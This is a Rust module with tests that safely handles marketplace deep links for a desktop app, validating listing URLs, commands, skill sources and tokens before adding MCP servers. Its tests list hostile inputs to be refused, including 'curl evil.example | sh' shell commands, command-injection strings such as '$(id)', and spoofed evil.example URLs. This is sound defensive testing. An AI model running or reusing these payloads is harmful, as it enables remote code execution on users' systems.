//! What letronna.ai/marketplace lists, and the link that asks for one of
//! its listings: `letronna://marketplace/<id>`, which the page's "Open in
//! Letronna" button hands to the window.
//!
//! Any web page, email or message can carry such a link, so it is read as
//! something a stranger wrote. It names a listing and nothing else: the
//! address, command or repository that adding the listing means comes from
//! the list letronna.ai publishes, read over https from the one address
//! built in here, and never from the link. The id is not sent anywhere
//! either: the whole list is fetched and looked through here.
//!
//! Reading a link or the list changes nothing on this computer. `add` is
//! for the window to call once the user has seen what it will do and
//! pressed Add, and it goes the way that kind is added by hand: an entry
//! in `mcp.json` and a reload for a server, `skills::install` for a skill.
//! What guards those afterwards -- a server's sign-in, the yes each of its
//! tools asks for, a skill's files never being run -- is theirs and is not
//! touched here.
//!
//! These listings are not the marketplace indexes of `plugins`, which are
//! lists of plugin repositories the user chose to read.

use crate::{mcp, skills};
use serde_json::{Value, json};
use std::path::Path;
use std::time::Duration;

/// The one address the list is read from.
pub const LIST: &str = "https://letronna.ai/marketplace.json";
/// The site a redirect of that address has to stay on.
const SITE: &str = "letronna.ai";
/// The shape of list this Letronna reads.
const VERSION: u64 = 1;
/// How long the list is waited for: it is one small file, and the user is
/// looking at a spinner.
const WAIT: Duration = Duration::from_secs(20);
/// An id's most characters; the longest listed today has sixteen.
const ID_CHARS: usize = 40;
/// Listings looked through in one list; the website has twenty-one.
const LISTINGS: usize = 1_000;
/// A name's or a maker's most characters, and a line's: what a card shows.
const NAME_CHARS: usize = 60;
const LINE_CHARS: usize = 240;
/// An address's most characters.
const ADDRESS_CHARS: usize = 200;
/// A command's most words, and a word's most characters.
const WORDS: usize = 16;
const WORD_CHARS: usize = 200;
/// The folders deep a skill's place in its repository goes at most.
const SOURCE_PARTS: usize = 8;
/// A token's most characters; GitHub's fine-grained ones have 93.
const TOKEN_CHARS: usize = 400;

/// What a link that names no listing is answered with.
const NOT_A_LISTING: &str = "That link is not one Letronna opens, so nothing was done with it.";
/// What a link to something the website does not list is answered with.
const NOT_LISTED: &str =
    "letronna.ai/marketplace does not list what that link names, so nothing was added.";
/// What a link of the phone app's is answered with. Nothing of the link is
/// repeated: a pairing code holds a secret.
const THE_PHONE_S: &str =
    "That link is for the Letronna app on a phone: open it there, or scan its code with the phone.";

/// What a listing is, in the website's words for its tabs.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Plugin,
    Skill,
    Mcp,
    Chat,
    Editor,
}

/// A page of the window where something that comes with Letronna is set up.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Page {
    Plugins,
    Messaging,
    Skills,
}

/// How a server reached by address knows who is asking.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Key {
    /// By a sign-in in the browser, started from the server's row once it
    /// is added.
    SignIn,
    /// By a token typed into the window, made at this address when the list
    /// gives one.
    Token(Option<String>),
}

/// What pressing Add does with a listing.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Way {
    /// An MCP server reached by address goes into `mcp.json`.
    Server { name: String, url: String, key: Key },
    /// An MCP server run on this computer goes into `mcp.json`: the words
    /// that start it, and whether a folder the user picks follows them.
    Command {
        name: String,
        words: Vec<String>,
        folder: bool,
    },
    /// A skill is downloaded from its place in a GitHub repository.
    Skill { source: String },
    /// It comes with Letronna, so its page is opened and nothing is added.
    Page(Page),
    /// It is set up in another program: there is nothing for Letronna to do.
    Elsewhere,
}

/// One thing the website lists, as far as adding it goes.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Listing {
    pub id: String,
    pub name: String,
    pub kind: Kind,
    /// Who makes the thing itself.
    pub maker: String,
    /// What it is, in a line; empty when the list has none.
    pub line: String,
    pub way: Way,
}

/// What `add` did.
#[derive(Clone, Debug, PartialEq)]
pub enum Added {
    /// A server is in `mcp.json` under this name, and starting.
    Server(String),
    Skills(skills::Installed),
}

/// The listing a link names. Only `letronna://marketplace/<id>` is one, the
/// id being lower-case letters, digits and hyphens: a query, a fragment, a
/// longer path or a letter out of place refuses the whole link rather than
/// reading around it.
pub fn id_of(link: &str) -> Result<String, String> {
    let Some(rest) = link.strip_prefix("letronna://") else {
        return Err(NOT_A_LISTING.into());
    };
    let place = rest.split(['/', '?', '#']).next().unwrap_or_default();
    if matches!(place, "pair" | "github") {
        return Err(THE_PHONE_S.into());
    }
    match rest.strip_prefix("marketplace/") {
        Some(id) if is_id(id) => Ok(id.to_owned()),
        _ => Err(NOT_A_LISTING.into()),
    }
}

/// What of `link` is kept when one start of the window hands it to another:
/// a listing's link whole, and of any other only enough to say again why it
/// is refused. So nothing a stranger wrote beyond an id, and no pairing
/// secret, is ever written to a file or held in a queue.
pub fn kept(link: &str) -> String {
    match id_of(link) {
        Ok(id) => format!("letronna://marketplace/{id}"),
        Err(why) if why == THE_PHONE_S => "letronna://pair".into(),
        Err(_) => "letronna://".into(),
    }
}

/// The listing `id` names in letronna.ai's list, read afresh. This waits on
/// the network, so call it off the UI thread. With no connection, or the
/// list not answering, it says so and that is all: no copy is kept here to
/// fall back on, so what Add would do is what the website says today.
pub fn find(id: &str) -> Result<Listing, String> {
    let list = fetch().map_err(|why| {
        format!("Letronna could not read letronna.ai's list to look this up, so nothing was added. {why}")
    })?;
    listed(&list, id)
}

/// The listing `id` names in `list`, the JSON letronna.ai publishes.
pub fn listed(list: &[u8], id: &str) -> Result<Listing, String> {
    let unread = "letronna.ai's list did not read, so nothing was added.";
    let list: Value = serde_json::from_slice(list).map_err(|_| unread.to_owned())?;
    let Some(listings) = list["listings"].as_array() else {
        return Err(unread.into());
    };
    match list["version"].as_u64() {
        Some(VERSION) => {}
        Some(later) if later > VERSION => {
            return Err(
                "letronna.ai's list is newer than this Letronna reads: update Letronna, then \
                 open the link again."
                    .into(),
            );
        }
        _ => return Err(unread.into()),
    }
    if !is_id(id) {
        return Err(NOT_A_LISTING.into());
    }
    let found = (listings.iter().take(LISTINGS)).find(|entry| entry["id"].as_str() == Some(id));
    let Some(entry) = found else {
        // The id is the link's own words, so it is not said back: a link
        // could otherwise put a line of its choosing in the dialog.
        return Err(NOT_LISTED.into());
    };
    listing(id, entry)
}

/// Add `listing` the way its kind is added by hand, and say what was done.
/// `given` is what the window asked the user for: the token of a server
/// that takes one, the folder of a command that works in one, and nothing
/// otherwise. A skill is downloaded, so call this off the UI thread.
pub fn add(listing: &Listing, given: &str) -> Result<Added, String> {
    if let Way::Skill { source } = &listing.way {
        return skills::install(source).map(Added::Skills);
    }
    let (name, entry) = entry(&listing.way, given)?;
    mcp::add_server(&name, entry)?;
    mcp::reload()?;
    Ok(Added::Server(name))
}

/// The name and `mcp.json` entry of the server `way` adds, as `letronna mcp
/// add` writes one. `given` is the token or the folder, as for `add`.
pub fn entry(way: &Way, given: &str) -> Result<(String, Value), String> {
    match way {
        Way::Server { name, url, key } => {
            let mut entry = json!({"type": "http", "url": url});
            if matches!(key, Key::Token(_)) {
                let bearer = format!("Bearer {}", token(given)?);
                entry["headers"] = json!({"Authorization": bearer});
            }
            Ok((name.clone(), entry))
        }
        Way::Command {
            name,
            words,
            folder,
        } => {
            let Some((program, rest)) = words.split_first() else {
                return Err("The list gives no command to run.".into());
            };
            let mut args = rest.to_vec();
            if *folder {
                args.push(folder_at(given)?);
            }
            Ok((name.clone(), json!({"command": program, "args": args})))
        }
        Way::Skill { .. } | Way::Page(_) | Way::Elsewhere => {
            Err("There is no server to add for it.".into())
        }
    }
}

/// The list's bytes from letronna.ai, over https and nowhere else.
fn fetch() -> Result<Vec<u8>, String> {
    // Only a build made for trying things out reads another list, a file on
    // this computer such as the fixture beside this module: a released one
    // has the one address.
    if cfg!(debug_assertions)
        && let Some(file) = std::env::var_os("LETRONNA_MARKETPLACE")
    {
        let file = Path::new(&file);
        return std::fs::read(file).map_err(|e| format!("Could not read {}: {e}", file.display()));
    }
    let address = reqwest::Url::parse(LIST).map_err(|e| e.to_string())?;
    let client = reqwest::blocking::Client::builder()
        .connect_timeout(Duration::from_secs(10))
        .timeout(WAIT)
        .user_agent(concat!("Letronna/", env!("CARGO_PKG_VERSION")))
        .redirect(reqwest::redirect::Policy::custom(|attempt| {
            let url = attempt.url();
            let ours = url.scheme() == "https" && url.host_str().is_some_and(on_site);
            if attempt.previous().len() >= 3 {
                attempt.error("too many redirects")
            } else if !ours {
                attempt.error("the list is read from letronna.ai only")
            } else {
                attempt.follow()
            }
        }))
        .build()
        .map_err(|e| format!("Could not start fetching: {e}"))?;
    skills::get(&client, address, "letronna.ai's list").map(|(bytes, _)| bytes)
}

/// Whether `host` is letronna.ai or under it.
fn on_site(host: &str) -> bool {
    host == SITE
        || host
            .strip_suffix(SITE)
            .is_some_and(|under| under.ends_with('.'))
}

/// Whether `text` is an id: lower-case letters, digits and hyphens, few.
fn is_id(text: &str) -> bool {
    (1..=ID_CHARS).contains(&text.len())
        && text
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
}

/// The listing an entry of the list describes, each part of it checked: a
/// list that asks for more than a list may is not added from.
fn listing(id: &str, entry: &Value) -> Result<Listing, String> {
    let said = |key: &str, most: usize| -> String {
        skills::printable(entry[key].as_str().unwrap_or_default())
            .chars()
            .take(most)
            .collect()
    };
    let name = match said("name", NAME_CHARS) {
        name if name.is_empty() => id.to_owned(),
        name => name,
    };
    // A kind or a way this Letronna has not heard of came after it did.
    let unknown = || {
        format!(
            "This Letronna does not know how {name} is added. Update Letronna, or add it by \
             hand as letronna.ai/marketplace/{id} says."
        )
    };
    let refused = |why: String| format!("letronna.ai's list does not say how to add {name}: {why}");
    let text = |key: &str| entry[key].as_str().unwrap_or_default();
    let (kind, way) = match (text("kind"), text("way")) {
        ("mcp", way @ ("login" | "token")) => {
            let key = match (way, entry.get("keyAt").and_then(Value::as_str)) {
                ("login", _) => Key::SignIn,
                (_, None) => Key::Token(None),
                (_, Some(at)) => Key::Token(Some(address(at).map_err(refused)?)),
            };
            let way = Way::Server {
                name: server(text("server")).map_err(refused)?,
                url: address(text("url")).map_err(refused)?,
                key,
            };
            (Kind::Mcp, way)
        }
        ("mcp", "command") => {
            let folder = match entry.get("asks").and_then(Value::as_str) {
                None => false,
                Some("folder") => true,
                Some(_) => return Err(unknown()),
            };
            let way = Way::Command {
                name: server(text("server")).map_err(refused)?,
                words: words(&entry["command"]).map_err(refused)?,
                folder,
            };
            (Kind::Mcp, way)
        }
        ("skill", "skill") => {
            let source = source(text("skill")).map_err(refused)?;
            (Kind::Skill, Way::Skill { source })
        }
        ("skill", "ships") => (Kind::Skill, Way::Page(Page::Skills)),
        ("plugin", "signin" | "switch") => (Kind::Plugin, Way::Page(Page::Plugins)),
        ("chat", "messaging") => (Kind::Chat, Way::Page(Page::Messaging)),
        ("editor", "editor") => (Kind::Editor, Way::Elsewhere),
        _ => return Err(unknown()),
    };
    Ok(Listing {
        id: id.to_owned(),
        name,
        kind,
        maker: said("maker", NAME_CHARS),
        line: said("line", LINE_CHARS),
        way,
    })
}

/// A server's name in `mcp.json`, which is an id as a listing's is.
fn server(name: &str) -> Result<String, String> {
    if !is_id(name) {
        return Err("its server has no plain name.".into());
    }
    Ok(name.to_owned())
}

/// An https address from the list, kept as it is written. It has to read
/// one way only: plain characters, the host exactly as the address shows
/// it, no name or password before it and no fragment after.
fn address(text: &str) -> Result<String, String> {
    let wrong = || format!("{} is not a plain https address.", skills::printable(text));
    let plain = text.len() <= ADDRESS_CHARS
        && text
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"-._~:/?&=%+".contains(&b));
    let Some(after) = text.strip_prefix("https://").filter(|_| plain) else {
        return Err(wrong());
    };
    let url = reqwest::Url::parse(text).map_err(|_| wrong())?;
    let host = url.host_str().unwrap_or_default();
    let shown = after.split(['/', '?']).next().unwrap_or_default();
    let host_as_shown = match url.port() {
        Some(port) => shown == format!("{host}:{port}"),
        None => shown == host,
    };
    if host.is_empty() || !host_as_shown || !url.username().is_empty() || url.password().is_some() {
        return Err(wrong());
    }
    Ok(text.to_owned())
}

/// The words that start a server on this computer: a program by its name,
/// never by a path, then what it is given, in plain characters only, so
/// the line shown is the line run. Nothing a shell reads as more than text
/// is among them, as Windows starts a script such as `npx` through `cmd`,
/// nor the `${...}` that `mcp.json` fills in from the environment.
fn words(command: &Value) -> Result<Vec<String>, String> {
    let wrong = || "its command is not a plain list of words.".to_owned();
    let Some(list) = command.as_array().filter(|list| list.len() <= WORDS) else {
        return Err(wrong());
    };
    let words: Vec<String> = (list.iter())
        .filter_map(|word| word.as_str().map(str::to_owned))
        .collect();
    let whole = |word: &String| {
        (1..=WORD_CHARS).contains(&word.len())
            && word
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"@/._:=+,-".contains(&b))
    };
    let named = words.first().is_some_and(|program| {
        program
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"-._".contains(&b))
            && !program.starts_with(['-', '.'])
    });
    if words.len() != list.len() || !named || !words.iter().all(whole) {
        return Err(wrong());
    }
    Ok(words)
}

/// A skill's place on GitHub, as a link to the repository or to a folder
/// in it: `https://github.com/<owner>/<repository>/tree/<branch>/<folder>`.
/// Only a link, because `skills::install` reads `owner/repository/folder`
/// as a folder on this computer whenever one of that name is there, and
/// only github.com, in plain characters, so it reads one way.
fn source(text: &str) -> Result<String, String> {
    let wrong = || "its skill is not at a plain place on github.com.".to_owned();
    let Some(place) = text.strip_prefix("https://github.com/") else {
        return Err(wrong());
    };
    let parts: Vec<&str> = place.split('/').collect();
    let plain = |part: &&str| {
        !part.is_empty()
            && !part.starts_with('.')
            && part.len() <= NAME_CHARS
            && part
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"-._".contains(&b))
    };
    let shaped = match parts.as_slice() {
        [_owner, _repository] => true,
        [_owner, _repository, "tree", _branch, folders @ ..] => folders.len() <= SOURCE_PARTS,
        _ => false,
    };
    if !shaped || !parts.iter().all(plain) {
        return Err(wrong());
    }
    Ok(text.to_owned())
}

/// The token as typed, without the `Bearer` some copy along with it.
fn token(typed: &str) -> Result<String, String> {
    let typed = typed.trim();
    let token = match typed.split_once(char::is_whitespace) {
        Some((word, rest)) if word.eq_ignore_ascii_case("bearer") => rest.trim_start(),
        None if typed.eq_ignore_ascii_case("bearer") => "",
        _ => typed,
    };
    if token.is_empty() {
        return Err("Paste the token first.".into());
    }
    // `${` would be filled in from the environment when the entry is read.
    let plain = token.bytes().all(|b| b.is_ascii_graphic()) && !token.contains("${");
    if token.len() > TOKEN_CHARS || !plain {
        return Err("That does not look like a token: it has a space or an odd character.".into());
    }
    Ok(token.to_owned())
}

/// What in a folder's path a command line would read as more than a name:
/// `${`, which `mcp.json` fills in from the environment, a control
/// character, and on Windows what `cmd` acts on, since a script such as
/// `npx` is started through it there with its arguments as they are.
fn misread(path: &str) -> Option<&'static str> {
    let on_windows: &[&str] = &["&", "|", "<", ">", "^", "%", "\""];
    let anywhere = ["${"].into_iter();
    let found = anywhere
        .chain(on_windows.iter().copied().filter(|_| cfg!(windows)))
        .find(|mark| path.contains(mark));
    found.or_else(|| path.chars().any(char::is_control).then_some("a line break"))
}

/// The folder picked, which has to be there, and to have a path that is
/// one argument however the command is started.
fn folder_at(picked: &str) -> Result<String, String> {
    let folder = Path::new(picked);
    if picked.is_empty() || !folder.is_absolute() || !folder.is_dir() {
        return Err("Pick the folder it should work in first.".into());
    }
    if let Some(mark) = misread(picked) {
        return Err(format!(
            "That folder's path has {mark} in it, which a command line would not read as \
             part of a name. Pick another folder, or add the server by hand."
        ));
    }
    Ok(picked.to_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The list the website will publish, as this Letronna expects it.
    const FIXTURE: &[u8] = include_bytes!("marketplace.fixture.json");

    /// A list holding one listing, `fields` over a server signed in to.
    fn list_of(fields: Value) -> Vec<u8> {
        let mut entry = json!({
            "id": "thing", "name": "Thing", "kind": "mcp", "way": "login",
            "server": "thing", "url": "https://mcp.example.com/mcp",
        });
        for (key, value) in fields.as_object().into_iter().flatten() {
            entry[key] = value.clone();
        }
        json!({"version": 1, "listings": [entry]})
            .to_string()
            .into_bytes()
    }

    #[test]
    fn a_link_names_a_listing_and_nothing_else() {
        assert_eq!(id_of("letronna://marketplace/linear").unwrap(), "linear");
        assert_eq!(
            id_of("letronna://marketplace/discord-presence").unwrap(),
            "discord-presence"
        );
        let longest = "a".repeat(ID_CHARS);
        assert_eq!(
            id_of(&format!("letronna://marketplace/{longest}")).unwrap(),
            longest
        );
        for refused in [
            "",
            "letronna://",
            "letronna://marketplace",
            "letronna://marketplace/",
            "letronna://marketplace/Linear",
            "letronna://marketplace/linear/",
            "letronna://marketplace/linear/extra",
            "letronna://marketplace/linear?url=https://evil.example/mcp",
            "letronna://marketplace/linear#x",
            "letronna://marketplace/lin ear",
            "letronna://marketplace/linear\n",
            "letronna://marketplace/linear%2F..",
            "letronna://marketplace/../linear",
            "letronna://marketplace/linear\" --uninstall \"",
            "letronna://Marketplace/linear",
            "LETRONNA://marketplace/linear",
            " letronna://marketplace/linear",
            "letronna:marketplace/linear",
            "letronna:///marketplace/linear",
            "letronna://user@marketplace/linear",
            "letronna://plugins/linear",
            "letronna://add?command=npx%20-y%20thing",
            "https://letronna.ai/marketplace/linear",
            "file:///etc/passwd",
        ] {
            assert_eq!(id_of(refused).unwrap_err(), NOT_A_LISTING, "{refused:?}");
        }
        let long = format!("letronna://marketplace/{longest}a");
        assert_eq!(id_of(&long).unwrap_err(), NOT_A_LISTING);
    }

    #[test]
    fn the_phone_app_s_links_are_left_to_the_phone_and_never_repeated() {
        for theirs in [
            "letronna://pair?v=1&k=a-public-key&s=a-secret",
            "letronna://pair",
            "letronna://github",
            "letronna://github?code=abc",
            "letronna://github/",
        ] {
            let said = id_of(theirs).unwrap_err();
            assert_eq!(said, THE_PHONE_S);
            assert!(!said.contains("a-secret") && !said.contains("abc"));
        }
        // Only those two words: one that starts like them is no one's.
        assert_eq!(id_of("letronna://pairs").unwrap_err(), NOT_A_LISTING);
    }

    #[test]
    fn a_link_handed_on_keeps_an_id_and_nothing_a_stranger_or_a_secret_put_in_it() {
        assert_eq!(
            kept("letronna://marketplace/linear"),
            "letronna://marketplace/linear"
        );
        assert_eq!(
            kept("letronna://pair?v=1&k=a-public-key&s=a-secret"),
            "letronna://pair"
        );
        assert_eq!(kept("letronna://github?code=abc"), "letronna://pair");
        let odd = "letronna://marketplace/linear?url=https://evil.example/mcp";
        assert_eq!(kept(odd), "letronna://");
        assert_eq!(kept(&"x".repeat(100_000)), "letronna://");
        // What is kept is refused, or read, for the same reason as the whole.
        for link in ["letronna://marketplace/pdf", "letronna://pair?s=1", odd, ""] {
            assert_eq!(id_of(&kept(link)), id_of(link), "{link}");
        }
    }

    #[test]
    fn every_listing_on_the_website_reads_with_its_own_way_of_adding() {
        let ids = [
            "telegram",
            "github",
            "chatgpt",
            "discord",
            "slack",
            "linear",
            "notion",
            "sentry",
            "stripe",
            "filesystem",
            "claude",
            "discord-presence",
            "letronna",
            "frontend-design",
            "webapp-testing",
            "mcp-builder",
            "skill-creator",
            "pdf",
            "docx",
            "zed",
            "jetbrains",
        ];
        for id in ids {
            let listing = listed(FIXTURE, id).unwrap();
            assert_eq!(listing.id, id);
            assert!(!listing.name.is_empty() && !listing.line.is_empty());
        }
        let way = |id: &str| listed(FIXTURE, id).unwrap().way;
        assert_eq!(
            way("linear"),
            Way::Server {
                name: "linear".into(),
                url: "https://mcp.linear.app/mcp".into(),
                key: Key::SignIn,
            }
        );
        // As the website writes it, with no slash put after the host.
        assert!(
            matches!(way("stripe"), Way::Server { url, .. } if url == "https://mcp.stripe.com")
        );
        assert!(matches!(
            way("github"),
            Way::Server { key: Key::Token(Some(at)), .. } if at.starts_with("https://github.com/")
        ));
        assert_eq!(
            way("filesystem"),
            Way::Command {
                name: "files".into(),
                words: ["npx", "-y", "@modelcontextprotocol/server-filesystem"]
                    .map(str::to_owned)
                    .to_vec(),
                folder: true,
            }
        );
        assert_eq!(
            way("pdf"),
            Way::Skill {
                source: "https://github.com/anthropics/skills/tree/main/skills/pdf".into()
            }
        );
        assert_eq!(way("letronna"), Way::Page(Page::Skills));
        assert_eq!(way("claude"), Way::Page(Page::Plugins));
        assert_eq!(way("discord-presence"), Way::Page(Page::Plugins));
        assert_eq!(way("telegram"), Way::Page(Page::Messaging));
        assert_eq!(way("zed"), Way::Elsewhere);
        assert_eq!(listed(FIXTURE, "zed").unwrap().kind, Kind::Editor);
    }

    #[test]
    fn what_is_not_listed_or_not_understood_says_so_and_gives_nothing() {
        // Nothing of the id is said back: it is the link's own words.
        let missing = listed(FIXTURE, "call-this-number-now").unwrap_err();
        assert_eq!(missing, NOT_LISTED);
        assert!(!missing.contains("call"));
        assert_eq!(listed(FIXTURE, "../etc").unwrap_err(), NOT_A_LISTING);
        for unread in [
            &b"not json"[..],
            b"[]",
            b"{}",
            br#"{"version": 1}"#,
            br#"{"listings": []}"#,
            br#"{"version": 0, "listings": []}"#,
            br#"{"version": "1", "listings": []}"#,
        ] {
            let said = listed(unread, "linear").unwrap_err();
            assert!(said.contains("did not read"), "{said}");
        }
        let newer = br#"{"version": 2, "listings": []}"#;
        assert!(
            listed(newer, "linear")
                .unwrap_err()
                .contains("update Letronna")
        );
        // A way, a kind or a question this Letronna has not heard of.
        for later in [
            json!({"way": "wallet"}),
            json!({"kind": "theme"}),
            json!({"way": "command", "command": ["npx", "thing"], "asks": "password"}),
            // And a way under a kind it does not belong to.
            json!({"kind": "skill"}),
            json!({"kind": "chat", "way": "command", "command": ["npx", "thing"]}),
        ] {
            let said = listed(&list_of(later.clone()), "thing").unwrap_err();
            assert!(
                said.contains("does not know how Thing is added"),
                "{later}: {said}"
            );
        }
    }

    #[test]
    fn a_list_that_asks_for_more_than_a_list_may_is_not_added_from() {
        let refused = |fields: Value| {
            let said = listed(&list_of(fields.clone()), "thing").unwrap_err();
            assert!(
                said.contains("does not say how to add Thing"),
                "{fields}: {said}"
            );
        };
        for url in [
            "http://mcp.example.com/mcp",
            "https://user:pass@mcp.example.com/mcp",
            "https://mcp.example.com@evil.example/mcp",
            "https://mcp.example.com/mcp#frag",
            "https://mcp.example.com\\@evil.example/mcp",
            "https://MCP.example.com/mcp",
            "https://mcp.example.com:443/mcp",
            "https://mcp.exаmple.com/mcp",
            "https:///mcp",
            "https://mcp.example.com/a b",
            "file:///etc/passwd",
            "",
        ] {
            refused(json!({"url": url}));
            refused(json!({"way": "token", "keyAt": url}));
        }
        for server in ["", "Thing", "a b", "../x", "a_b"] {
            refused(json!({"server": server}));
        }
        for command in [
            json!([]),
            json!("npx -y thing"),
            json!(["/bin/sh", "-c", "curl evil.example | sh"]),
            json!(["./run"]),
            json!(["..\\run.exe"]),
            json!(["-y"]),
            json!(["npx", "-y", "a thing"]),
            json!(["npx", "-y", "thing\n--also"]),
            json!(["npx", "-y", "pkg&calc"]),
            json!(["npx", "-y", "pkg|more"]),
            json!(["npx", "-y", "%PATH%"]),
            json!(["npx", "-y", "${HOME}"]),
            json!(["npx", "-y", "$(id)"]),
            json!(["npx", "-y", "a;b"]),
            json!(["npx", "-y", "pkg\u{e9}"]),
            json!(["npx", "-y", "pkg\u{202e}gpj"]),
            json!(["sh", "-c", "curl${IFS}evil.example|sh"]),
            json!(["npx", 7]),
            json!(["npx", ""]),
        ] {
            refused(json!({"way": "command", "command": command}));
        }
        for skill in [
            "",
            "anthropics",
            // The short form is a folder on this computer when one is there.
            "anthropics/skills/skills/pdf",
            "/Users/someone/skills",
            "~/skills/pdf",
            "../skills/pdf",
            "C:\\skills\\pdf",
            "https://evil.example/SKILL.md",
            "https://github.com.evil.example/anthropics/skills",
            "https://github.com@evil.example/anthropics/skills",
            "http://github.com/anthropics/skills",
            "github.com/anthropics/skills",
            "https://github.com/anthropics",
            "https://github.com/anthropics/skills/",
            "https://github.com/anthropics/skills/tree",
            "https://github.com/anthropics/skills/blob/main/SKILL.md",
            "https://github.com/anthropics/skills/tree/main/../pdf",
            "https://github.com/anthropics/skills/tree/main/.git",
            "https://github.com/anthropics/skills/tree/main/a%2Fb",
            "https://github.com/anthropics/skills/tree/main/a b",
            "https://github.com/anthropics/skills?tab=readme",
            "https://github.com/anthropics/skills#readme",
        ] {
            refused(json!({"kind": "skill", "way": "skill", "skill": skill}));
        }
        for skill in [
            "https://github.com/anthropics/skills",
            "https://github.com/anthropics/skills/tree/main",
            "https://github.com/anthropics/skills/tree/main/skills/pdf",
        ] {
            let fields = json!({"kind": "skill", "way": "skill", "skill": skill});
            let way = listed(&list_of(fields), "thing").unwrap().way;
            assert_eq!(
                way,
                Way::Skill {
                    source: skill.into()
                }
            );
        }
    }

    #[test]
    fn a_name_or_a_line_from_the_list_is_shown_plain_and_short() {
        let list = list_of(json!({
            "name": "Thing\u{1b}[31m\nPress Add",
            "maker": "x".repeat(500),
            "line": "y".repeat(500),
        }));
        let listing = listed(&list, "thing").unwrap();
        assert_eq!(listing.name, "Thing[31m Press Add");
        assert_eq!(listing.maker.chars().count(), NAME_CHARS);
        assert_eq!(listing.line.chars().count(), LINE_CHARS);
        // With no name, it goes by its id.
        let unnamed = listed(&list_of(json!({"name": ""})), "thing").unwrap();
        assert_eq!(unnamed.name, "thing");
    }

    #[test]
    fn a_server_s_entry_is_the_one_mcp_add_writes() {
        let way = |id: &str| listed(FIXTURE, id).unwrap().way;
        assert_eq!(
            entry(&way("linear"), "").unwrap(),
            (
                "linear".to_owned(),
                json!({"type": "http", "url": "https://mcp.linear.app/mcp"})
            )
        );
        // What is typed goes nowhere for a server that signs in instead.
        assert_eq!(
            entry(&way("linear"), "a-token").unwrap(),
            entry(&way("linear"), "").unwrap()
        );
        let (name, github) = entry(&way("github"), "  Bearer github_pat_11AB \n").unwrap();
        assert_eq!(name, "github");
        assert_eq!(
            github,
            json!({
                "type": "http", "url": "https://api.githubcopilot.com/mcp/",
                "headers": {"Authorization": "Bearer github_pat_11AB"},
            })
        );
        let folder = std::env::temp_dir();
        let picked = folder.to_str().unwrap();
        assert_eq!(
            entry(&way("filesystem"), picked).unwrap(),
            (
                "files".to_owned(),
                json!({
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem", picked],
                })
            )
        );
    }

    #[test]
    fn a_token_or_a_folder_that_is_not_one_adds_nothing() {
        let way = |id: &str| listed(FIXTURE, id).unwrap().way;
        for typed in [
            "",
            "   ",
            "Bearer ",
            "two words",
            "line\nbreak",
            "tökén",
            "tok${HOME}en",
        ] {
            assert!(entry(&way("github"), typed).is_err(), "{typed:?}");
        }
        assert!(entry(&way("github"), &"x".repeat(TOKEN_CHARS + 1)).is_err());
        let file = crate::store::tests::Scratch::new("marketplace-folder");
        let not_a_folder = file.join("notes.txt");
        std::fs::write(&not_a_folder, "").unwrap();
        for picked in [
            "",
            "notes",
            "/no/such/folder/anywhere",
            not_a_folder.to_str().unwrap(),
        ] {
            assert!(entry(&way("filesystem"), picked).is_err(), "{picked:?}");
        }
        // A path that `mcp.json` or a command line would read as more than
        // one name is refused, though the folder is there.
        let odd = file.join("notes${HOME}");
        std::fs::create_dir_all(&odd).unwrap();
        let said = entry(&way("filesystem"), odd.to_str().unwrap()).unwrap_err();
        assert!(said.contains("${"), "{said}");
        assert_eq!(misread("/work/R&D").is_some(), cfg!(windows));
        assert_eq!(misread("C:\\work\\100%").is_some(), cfg!(windows));
        assert_eq!(misread("/work/notes\n--also"), Some("a line break"));
        assert_eq!(misread("/work/My Notes (old)"), None);
        // And what only has a page, or is set up elsewhere, has no server.
        for id in ["claude", "telegram", "letronna", "pdf", "zed"] {
            assert!(entry(&way(id), "").is_err(), "{id}");
        }
    }

    #[test]
    fn the_list_may_only_be_sent_on_within_letronna_ai() {
        assert!(on_site("letronna.ai") && on_site("www.letronna.ai"));
        for elsewhere in ["evil-letronna.ai", "letronna.ai.evil.example", "ai", ""] {
            assert!(!on_site(elsewhere), "{elsewhere}");
        }
        assert!(LIST.starts_with("https://letronna.ai/"));
    }
}
